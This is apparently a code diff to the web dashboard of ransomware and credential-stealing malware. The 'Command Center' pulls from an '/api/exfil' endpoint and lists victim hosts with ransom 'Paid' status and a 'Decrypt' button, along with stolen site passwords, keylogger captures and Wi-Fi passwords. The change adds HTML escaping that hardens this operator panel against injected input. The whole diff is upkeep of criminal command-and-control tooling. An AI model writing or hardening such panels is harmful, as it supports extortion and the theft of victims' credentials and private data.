@@ -178,7 +178,10 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>Command Center</h1>
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <img src="/kaoskaki.webp" alt="Logo" style="height: 32px; border-radius: 4px;">
+                <h1>Command Center</h1>
+            </div>
             <button class="refresh-btn" onclick="loadData()">Refresh Data</button>
         </div>
 
@@ -284,6 +287,19 @@
 
         const API = '/api/exfil';
 
+        function escapeHTML(str) {
+            if (typeof str !== 'string') return String(str);
+            return str.replace(/[&<>'"]/g, 
+                tag => ({
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    "'": '&#39;',
+                    '"': '&quot;'
+                }[tag] || tag)
+            );
+        }
+
         async function loadData() {
             try {
                 const btn = document.querySelector('.refresh-btn');
@@ -309,11 +325,11 @@
                 sBody.innerHTML = (data.sessions || []).map(s => {
                     const status = s.is_paid ? '<span class="badge badge-paid">Paid</span>' : '<span class="badge badge-active">Active</span>';
                     return `<tr>
-        <td><code>${s.id?.substring(0, 8)}</code></td>
-        <td>${s.hostname || '?'}<br><span style="color:#888;font-size:11px">${s.username || '?'}</span></td>
-        <td>${s.ip || '?'}</td>
+        <td><code>${escapeHTML(s.id?.substring(0, 8) || '?')}</code></td>
+        <td>${escapeHTML(s.hostname || '?')}<br><span style="color:#888;font-size:11px">${escapeHTML(s.username || '?')}</span></td>
+        <td>${escapeHTML(s.ip || '?')}</td>
         <td>${status}</td>
-        <td><button onclick="markPaid('${s.id}')" class="action-btn">Decrypt</button></td>
+        <td><button onclick="markPaid('${escapeHTML(s.id || '')}')" class="action-btn">Decrypt</button></td>
       </tr>`;
                 }).join('');
 
@@ -321,9 +337,9 @@
                 cBody.innerHTML = (data.credentials || []).map(c => {
                     const cred = c.data || {};
                     return `<tr>
-        <td>${cred.url || cred.origin || '?'}</td>
-        <td>${cred.username || cred.email || '?'}</td>
-        <td><code>${cred.password || '?'}</code></td>
+        <td>${escapeHTML(cred.url || cred.origin || '?')}</td>
+        <td>${escapeHTML(cred.username || cred.email || '?')}</td>
+        <td><code>${escapeHTML(cred.password || '?')}</code></td>
       </tr>`;
                 }).join('');
 
@@ -331,9 +347,9 @@
                 kBody.innerHTML = (data.keylogs || []).map(k => {
                     const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
                     return `<tr>
-        <td><code>${k.session_id?.substring(0, 8)}</code></td>
-        <td>${(k.data?.content || k.data || '').substring(0, 60)}...</td>
-        <td><span style="color:#888;font-size:11px">${ts}</span></td>
+        <td><code>${escapeHTML(k.session_id?.substring(0, 8) || '?')}</code></td>
+        <td>${escapeHTML((k.data?.content || k.data || '').substring(0, 60))}...</td>
+        <td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td>
       </tr>`;
                 }).join('');
 
@@ -344,9 +360,9 @@
                     const ssid = Array.isArray(wifiData) ? wifiData.map(x => x.ssid).join(', ') : wifiData.ssid || '?';
                     const pass = Array.isArray(wifiData) ? wifiData.map(x => x.password).join(', ') : wifiData.password || '?';
                     return `<tr>
-        <td>${ssid}</td>
-        <td><code>${pass}</code></td>
-        <td><span style="color:#888;font-size:11px">${ts}</span></td>
+        <td>${escapeHTML(ssid)}</td>
+        <td><code>${escapeHTML(pass)}</code></td>
+        <td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td>
       </tr>`;
                 }).join('');
 
